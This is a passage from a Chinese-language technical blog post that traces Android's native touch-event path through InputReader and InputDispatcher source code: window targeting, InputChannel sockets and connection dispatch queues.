<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">InputReader::InputReader(<span class="keyword">const</span> sp&lt;EventHubInterface&gt;&amp; eventHub,</span><br><span class="line">        <span class="keyword">const</span> sp&lt;InputReaderPolicyInterface&gt;&amp; policy,</span><br><span class="line">        <span class="keyword">const</span> sp&lt;InputListenerInterface&gt;&amp; listener) :</span><br><span class="line">        mContext(<span class="keyword">this</span>), mEventHub(eventHub), mPolicy(policy),</span><br><span class="line">        mGlobalMetaState(<span class="number">0</span>), mGeneration(<span class="number">1</span>),</span><br><span class="line">        mDisableVirtualKeysTimeout(LLONG_MIN), mNextTimeout(LLONG_MAX),</span><br><span class="line">        mConfigurationChangesToRefresh(<span class="number">0</span>) &#123;</span><br><span class="line">    mQueuedListener = <span class="keyword">new</span> QueuedInputListener(listener);</span><br><span class="line"></span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">        refreshConfigurationLocked(<span class="number">0</span>);</span><br><span class="line">        updateGlobalMetaStateLocked();</span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>InputReader</code>构造函数中构造<code>QueuedInputListener</code>。</p>
<p>而<code>InputReader</code>是由<code>InputManager</code>类进行初始化的（线程的新建也在这个类中）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">InputManager::InputManager(</span><br><span class="line">        <span class="keyword">const</span> sp&lt;EventHubInterface&gt;&amp; eventHub,</span><br><span class="line">        <span class="keyword">const</span> sp&lt;InputReaderPolicyInterface&gt;&amp; readerPolicy,</span><br><span class="line">        <span class="keyword">const</span> sp&lt;InputDispatcherPolicyInterface&gt;&amp; dispatcherPolicy) &#123;</span><br><span class="line">    mDispatcher = <span class="keyword">new</span> InputDispatcher(dispatcherPolicy);</span><br><span class="line">    mReader = <span class="keyword">new</span> InputReader(eventHub, readerPolicy, mDispatcher);</span><br><span class="line">    initialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到第6行中，传入的<code>listener</code>正是<code>mDispatcher</code>也就是<code>InputDispatcher</code>对象。</p>
<p>所以说，<code>listener-&gt;notifyMotion(this);</code>调用的是<code>InputDispatcher</code>的<code>notifyMotion()</code>函数，至此，<code>InputReader</code>的工作已经完成，它从<code>EventHub</code>中循环读取地<code>rawEvent</code>事件，并处理成<code>args</code>再通知<code>InputDispatcher</code>对事件进行进一步的分发处理。</p>
<h4 id="InputDispatcher"><a href="#InputDispatcher" class="headerlink" title="InputDispatcher"></a>InputDispatcher</h4><p>我们直接来到<code>InputDispatcher</code>的源码，路径：<code>frameworks/native/services/inputflinger/InputDispatcher.cpp</code></p>
<p>上面说到最终调用了<code>InputDispatcher</code>的<code>notifyMotion</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MotionEvent event;</span><br><span class="line">event.initialize(args-&gt;deviceId, args-&gt;source, args-&gt;action, args-&gt;actionButton,args-&gt;flags, args-&gt;edgeFlags, args-&gt;metaState, args-&gt;buttonState, <span class="number">0</span>, <span class="number">0</span>, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime, args-&gt;eventTime, args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// Just enqueue a new motion event.</span></span><br><span class="line">MotionEntry* newEntry = <span class="keyword">new</span> MotionEntry(args-&gt;eventTime,</span><br><span class="line">                args-&gt;deviceId, args-&gt;source, policyFlags,</span><br><span class="line">                args-&gt;action, args-&gt;actionButton, args-&gt;flags,</span><br><span class="line">                args-&gt;metaState, args-&gt;buttonState,</span><br><span class="line">                args-&gt;edgeFlags, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime,</span><br><span class="line">                args-&gt;displayId,</span><br><span class="line">                args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">needWake = enqueueInboundEventLocked(newEntry);</span><br></pre></td></tr></table></figure>
<p>里面新建并初始化了一个<code>MotionEvent</code>，然后包装成一个<code>Entry</code>，然后调用<code>enqueueInboundEventLocked()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mInboundQueue.enqueueAtTail(entry);</span><br></pre></td></tr></table></figure>
<p>在<code>enqueueInboundEventLocked()</code>函数中将这个<code>entry</code>插入到了<code>mInboundQueue</code>这个<code>InputDispatcher</code>维护的成员变量中。</p>
<p>到这里我们可以看到事件经过一系列的处理和传递以后最终作为一个<code>entry</code>插入到了<code>InputDispatcher</code>的队列中等待被进一步分发。</p>
<p>这个分发过程是在哪里进行的呢？</p>
<p><code>InputDispatcher</code>线程的<code>threadLoop()</code>函数会被不断调用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InputDispatcherThread::threadLoop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mDispatcher-&gt;dispatchOnce();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>dispatcherOnce()</code>中：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!haveCommandsLocked()) &#123;</span><br><span class="line">	dispatchOnceInnerLocked(&amp;nextWakeupTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在没有待执行的指令时执行<code>dispatchOnceInnerLocked()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mPendingEvent = mInboundQueue.dequeueAtHead();</span><br></pre></td></tr></table></figure>
<p>这个函数中还包含了<code>ANR</code>的判断信息，关于<code>ANR</code>的部分之后再另开博文讲。</p>
<p>若<code>mInboundQueue</code>不为空，则从中取出头部的<code>pendingEvent</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (mPendingEvent-&gt;type) &#123;</span><br><span class="line"><span class="keyword">case</span> EventEntry::TYPE_CONFIGURATION_CHANGED: &#123;</span><br><span class="line">    ConfigurationChangedEntry *typedEntry = <span class="keyword">static_cast</span>&lt;ConfigurationChangedEntry *&gt;(mPendingEvent);</span><br><span class="line">    done = dispatchConfigurationChangedLocked(currentTime, typedEntry);</span><br><span class="line">    dropReason = DROP_REASON_NOT_DROPPED; <span class="comment">// configuration changes are never dropped</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> EventEntry::TYPE_DEVICE_RESET: &#123;</span><br><span class="line">    DeviceResetEntry *typedEntry = <span class="keyword">static_cast</span>&lt;DeviceResetEntry *&gt;(mPendingEvent);</span><br><span class="line">    done = dispatchDeviceResetLocked(currentTime, typedEntry);</span><br><span class="line">    dropReason = DROP_REASON_NOT_DROPPED; <span class="comment">// device resets are never dropped</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> EventEntry::TYPE_KEY: &#123;</span><br><span class="line">    KeyEntry *typedEntry = <span class="keyword">static_cast</span>&lt;KeyEntry *&gt;(mPendingEvent);</span><br><span class="line">    <span class="keyword">if</span> (isAppSwitchDue) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isAppSwitchKeyEventLocked(typedEntry)) &#123;</span><br><span class="line">            resetPendingAppSwitchLocked(<span class="literal">true</span>);</span><br><span class="line">            isAppSwitchDue = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED) &#123;</span><br><span class="line">            dropReason = DROP_REASON_APP_SWITCH;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123;</span><br><span class="line">        dropReason = DROP_REASON_STALE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123;</span><br><span class="line">        dropReason = DROP_REASON_BLOCKED;</span><br><span class="line">    &#125;</span><br><span class="line">    done = dispatchKeyLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> EventEntry::TYPE_MOTION: &#123;</span><br><span class="line">    MotionEntry *typedEntry = <span class="keyword">static_cast</span>&lt;MotionEntry *&gt;(mPendingEvent);</span><br><span class="line">    <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isAppSwitchDue) &#123;</span><br><span class="line">        dropReason = DROP_REASON_APP_SWITCH;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123;</span><br><span class="line">        dropReason = DROP_REASON_STALE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123;</span><br><span class="line">        dropReason = DROP_REASON_BLOCKED;</span><br><span class="line">    &#125;</span><br><span class="line">    done = dispatchMotionLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    ALOG_ASSERT(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面对取出的<code>mPendingEvent</code>的类型进行判断，根据不同的类型信息把它转换回原来的<code>Entry</code>信息，然后调用相应的分发方法，我们还是顺着触摸事件分发这条路继续向下走，调用了<code>bool InputDispatcher::dispatchMotionLocked()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span> injectionResult;</span><br><span class="line"><span class="keyword">if</span> (isPointerEvent) &#123;</span><br><span class="line"><span class="comment">// Pointer event.  (eg. touchscreen)</span></span><br><span class="line">	injectionResult = findTouchedWindowTargetsLocked(currentTime,</span><br><span class="line">	entry, inputTargets, nextWakeupTime, &amp;conflictingPointerActions);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Non touch event.  (eg. trackball)</span></span><br><span class="line">	injectionResult = findFocusedWindowTargetsLocked(currentTime,</span><br><span class="line">                entry, inputTargets, nextWakeupTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对触摸或轨迹球事件做一个判断，再调用<code>findTouchedWindowTargesLocked()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span> pointerIndex = getMotionEventActionPointerIndex(action);</span><br><span class="line"><span class="keyword">int32_t</span> x = <span class="keyword">int32_t</span>(entry-&gt;pointerCoords[pointerIndex].</span><br><span class="line">                getAxisValue(AMOTION_EVENT_AXIS_X));</span><br><span class="line"><span class="keyword">int32_t</span> y = <span class="keyword">int32_t</span>(entry-&gt;pointerCoords[pointerIndex].</span><br><span class="line">                getAxisValue(AMOTION_EVENT_AXIS_Y));</span><br></pre></td></tr></table></figure>
<p>在这里取出了<code>entry</code>里面的<code>pointerIndex</code>与触摸点坐标的<code>x</code> <code>y</code>值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从前向后遍历所有的window以找出触摸的window</span></span><br><span class="line"><span class="keyword">size_t</span> numWindows = mWindowHandles.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; numWindows; i++) &#123;</span><br><span class="line">    sp&lt;InputWindowHandle&gt; windowHandle = mWindowHandles.itemAt(i);</span><br><span class="line">    <span class="keyword">const</span> InputWindowInfo *windowInfo = windowHandle-&gt;getInfo();</span><br><span class="line">    <span class="keyword">if</span> (windowInfo-&gt;displayId != displayId) &#123;</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// 错误的window(displayId不匹配)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> flags = windowInfo-&gt;layoutParamsFlags;</span><br><span class="line">    <span class="keyword">if</span> (windowInfo-&gt;visible) &#123; <span class="comment">// 如果window可见</span></span><br><span class="line">        <span class="keyword">if</span> (!(flags &amp; InputWindowInfo::FLAG_NOT_TOUCHABLE)) &#123;</span><br><span class="line">            isTouchModal = (flags &amp; (InputWindowInfo::FLAG_NOT_FOCUSABLE |</span><br><span class="line">                                     InputWindowInfo::FLAG_NOT_TOUCH_MODAL)) == <span class="number">0</span>;</span><br><span class="line">          <span class="comment">// window可以被触摸</span></span><br><span class="line">            <span class="keyword">if</span> (isTouchModal || windowInfo-&gt;touchableRegionContainsPoint(x, y)) &#123; <span class="comment">// (x,y)在window内可触摸区域内</span></span><br><span class="line">                newTouchedWindowHandle = windowHandle;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 找到触摸的window，保存在newTouchedWindowHandle中</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 判断是否触摸window之外的区域</span></span><br><span class="line">        <span class="keyword">if</span> (maskedAction == AMOTION_EVENT_ACTION_DOWN &amp;&amp;</span><br><span class="line">            (flags &amp; InputWindowInfo::FLAG_WATCH_OUTSIDE_TOUCH)) &#123;</span><br><span class="line">            <span class="keyword">int32_t</span> outsideTargetFlags = InputTarget::FLAG_DISPATCH_AS_OUTSIDE;</span><br><span class="line">            <span class="keyword">if</span> (isWindowObscuredAtPointLocked(windowHandle, x, y)) &#123;</span><br><span class="line">                outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_OBSCURED;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isWindowObscuredLocked(windowHandle)) &#123;</span><br><span class="line">                outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_PARTIALLY_OBSCURED;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mTempTouchState.addOrUpdateWindow(windowHandle, outsideTargetFlags, BitSet32(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的目的是为了遍历所有的<code>window</code>找到触摸对应的那个<code>window</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handle the case where we did not find a window.</span></span><br><span class="line"><span class="keyword">if</span> (newTouchedWindowHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// Try to assign the pointer to the first foreground window we find, if there is one.</span></span><br><span class="line">    newTouchedWindowHandle = mTempTouchState.getFirstForegroundWindowHandle();</span><br><span class="line">    <span class="keyword">if</span> (newTouchedWindowHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGI(<span class="string">"Dropping event because there is no touchable window at (%d, %d)."</span>, x, y);</span><br><span class="line">        injectionResult = INPUT_EVENT_INJECTION_FAILED;</span><br><span class="line">        <span class="keyword">goto</span> Failed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果遍历后没有找到合适的<code>window</code>，那就取第一个前台的<code>window</code>。</p>
<p>然后通过<code>addWindowTargetLocked()</code>方法把缓存下来的结果存放入<code>inputTargets</code>中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; mTempTouchState.windows.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">	<span class="keyword">const</span> TouchedWindow&amp; touchedWindow = mTempTouchState.windows.itemAt(i);</span><br><span class="line">	addWindowTargetLocked(touchedWindow.windowHandle, touchedWindow.targetFlags,</span><br><span class="line">	touchedWindow.pointerIds, inputTargets);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputDispatcher::addWindowTargetLocked</span><span class="params">(<span class="keyword">const</span> sp&lt;InputWindowHandle&gt;&amp; windowHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int32_t</span> targetFlags, BitSet32 pointerIds, Vector&lt;InputTarget&gt;&amp; inputTargets)</span> </span>&#123;</span><br><span class="line">    inputTargets.push();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> InputWindowInfo* windowInfo = windowHandle-&gt;getInfo();</span><br><span class="line">    InputTarget&amp; target = inputTargets.editTop();</span><br><span class="line">    target.inputChannel = windowInfo-&gt;inputChannel;</span><br><span class="line">    target.flags = targetFlags;</span><br><span class="line">    target.xOffset = - windowInfo-&gt;frameLeft;</span><br><span class="line">    target.yOffset = - windowInfo-&gt;frameTop;</span><br><span class="line">    target.scaleFactor = windowInfo-&gt;scaleFactor;</span><br><span class="line">    target.pointerIds = pointerIds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数将原始的<code>window</code>数据进行了再次封装。</p>
<p>找到合适的<code>window</code>或是没有找到（处理错误）之后，函数返回到<code>bool InputDispatcher::dispatchMotionLocked()</code>中：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dispatchEventLocked(currentTime, entry, inputTargets);</span><br></pre></td></tr></table></figure>
<p>开始向<code>inputTargets</code>中的目标分发事件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputDispatcher::dispatchEventLocked</span><span class="params">(<span class="keyword">nsecs_t</span> currentTime,</span></span></span><br><span class="line"><span class="function"><span class="params">        EventEntry* eventEntry, <span class="keyword">const</span> Vector&lt;InputTarget&gt;&amp; inputTargets)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; inputTargets.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> InputTarget&amp; inputTarget = inputTargets.itemAt(i); <span class="comment">// 遍历目标</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">ssize_t</span> connectionIndex = getConnectionIndexLocked(inputTarget.inputChannel); <span class="comment">// 见下文</span></span><br><span class="line">        <span class="keyword">if</span> (connectionIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex);</span><br><span class="line">            prepareDispatchCycleLocked(currentTime, connection, eventEntry, &amp;inputTarget);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>inputTarget</code>中包含的<code>inputChannel</code>就是后面用于与<code>window</code>实例通信的关键：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * An input channel consists of a local unix domain socket used to send and receive</span></span><br><span class="line"><span class="comment"> * input messages across processes.  Each channel has a descriptive name for debugging purposes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Each endpoint has its own InputChannel object that specifies its file descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The input channel is closed when all references to it are released.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputChannel</span> :</span> <span class="keyword">public</span> RefBase &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~InputChannel();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    InputChannel(<span class="keyword">const</span> String8&amp; name, <span class="keyword">int</span> fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Creates a pair of input channels.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Returns OK on success.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">status_t</span> <span class="title">openInputChannelPair</span><span class="params">(<span class="keyword">const</span> String8&amp; name,</span></span></span><br><span class="line"><span class="function"><span class="params">            sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> String8 <span class="title">getName</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> mName; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">getFd</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> mFd; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Sends a message to the other endpoint.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If the channel is full then the message is guaranteed not to have been sent at all.</span></span><br><span class="line"><span class="comment">     * Try again after the consumer has sent a finished signal indicating that it has</span></span><br><span class="line"><span class="comment">     * consumed some of the pending messages from the channel.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Returns OK on success.</span></span><br><span class="line"><span class="comment">     * Returns WOULD_BLOCK if the channel is full.</span></span><br><span class="line"><span class="comment">     * Returns DEAD_OBJECT if the channel's peer has been closed.</span></span><br><span class="line"><span class="comment">     * Other errors probably indicate that the channel is broken.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">status_t</span> <span class="title">sendMessage</span><span class="params">(<span class="keyword">const</span> InputMessage* msg)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Receives a message sent by the other endpoint.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If there is no message present, try again after poll() indicates that the fd</span></span><br><span class="line"><span class="comment">     * is readable.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Returns OK on success.</span></span><br><span class="line"><span class="comment">     * Returns WOULD_BLOCK if there is no message present.</span></span><br><span class="line"><span class="comment">     * Returns DEAD_OBJECT if the channel's peer has been closed.</span></span><br><span class="line"><span class="comment">     * Other errors probably indicate that the channel is broken.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">status_t</span> <span class="title">receiveMessage</span><span class="params">(InputMessage* msg)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Returns a new object that has a duplicate of this channel's fd. */</span></span><br><span class="line">    <span class="function">sp&lt;InputChannel&gt; <span class="title">dup</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    String8 mName;</span><br><span class="line">    <span class="keyword">int</span> mFd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>  <code>InputChannel</code>包含了一个本地<code>unix socket</code>用于跨进程发送与接收输入信息。</p>
</blockquote>
<p>它的接口十分简单，我们就通过<code>sendMessage()</code>与<code>receiveMessage()</code>两个函数实现跨进程通信。</p>
<p>回到之前，我们通过这个<code>inputChannel</code>的<code>Fd</code>（文件描述符）来获取一个<code>Connection</code>的索引，然后根据这个索引从<code>mConnectionsByFd</code>中获取<code>connection</code>对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">InputDispatcher::getConnectionIndexLocked</span><span class="params">(<span class="keyword">const</span> sp&lt;InputChannel&gt;&amp; inputChannel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> connectionIndex = mConnectionsByFd.indexOfKey(inputChannel-&gt;getFd());</span><br><span class="line">    <span class="keyword">if</span> (connectionIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex);</span><br><span class="line">        <span class="keyword">if</span> (connection-&gt;inputChannel.<span class="built_in">get</span>() == inputChannel.<span class="built_in">get</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> connectionIndex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>mConnectionByFd</code>又是怎么建立起来的呢？在<code>InputDispatcher</code>中包含了一个<code>registerInputChannel</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">InputDispatcher::registerInputChannel</span><span class="params">(<span class="keyword">const</span> sp&lt;InputChannel&gt;&amp; inputChannel,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, <span class="keyword">bool</span> monitor)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        sp&lt;Connection&gt; connection = <span class="keyword">new</span> Connection(inputChannel, inputWindowHandle, monitor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = inputChannel-&gt;getFd();</span><br><span class="line">        mConnectionsByFd.add(fd, connection);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (monitor) &#123;</span><br><span class="line">            mMonitoringChannels.push(inputChannel);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLooper-&gt;addFd(fd, <span class="number">0</span>, ALOOPER_EVENT_INPUT, handleReceiveCallback, <span class="keyword">this</span>); </span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wake the looper because some connections have changed.</span></span><br><span class="line">    mLooper-&gt;wake();</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>connection</code>对象就是在这里由<code>inputChannel</code>构造并加入到<code>mConnectionsByFd</code>中的。而<code>mConnectionsByFd</code>本身是一个以<code>Fd</code>为索引的键值对：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">KeyedVector&lt;<span class="keyword">int</span>, sp&lt;Connection&gt; &gt; mConnectionsByFd;</span><br></pre></td></tr></table></figure>
<p>取得<code>connection</code>对象之后，进入到了<code>prepareDispatchCycleLocked()</code>函数中，这个函数对连接的状态是否正常进行检测，连接正常会调用<code>enqueueDispatchEntriesLocked()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputDispatcher::enqueueDispatchEntriesLocked</span><span class="params">(<span class="keyword">nsecs_t</span> currentTime,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, <span class="keyword">const</span> InputTarget* inputTarget)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> wasEmpty = connection-&gt;outboundQueue.isEmpty();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enqueue dispatch entries for the requested modes.</span></span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_HOVER_EXIT);</span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_OUTSIDE);</span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_HOVER_ENTER);</span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_IS);</span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_SLIPPERY_EXIT);</span><br><span class="line">    enqueueDispatchEntryLocked(connection, eventEntry, inputTarget,</span><br><span class="line">            InputTarget::FLAG_DISPATCH_AS_SLIPPERY_ENTER);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the outbound queue was previously empty, start the dispatch cycle going.</span></span><br><span class="line">    <span class="keyword">if</span> (wasEmpty &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123;</span><br><span class="line">        startDispatchCycleLocked(currentTime, connection);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>中间调用了一系列的<code>enqueueDispatchEntryLocked()</code>函数：</p>
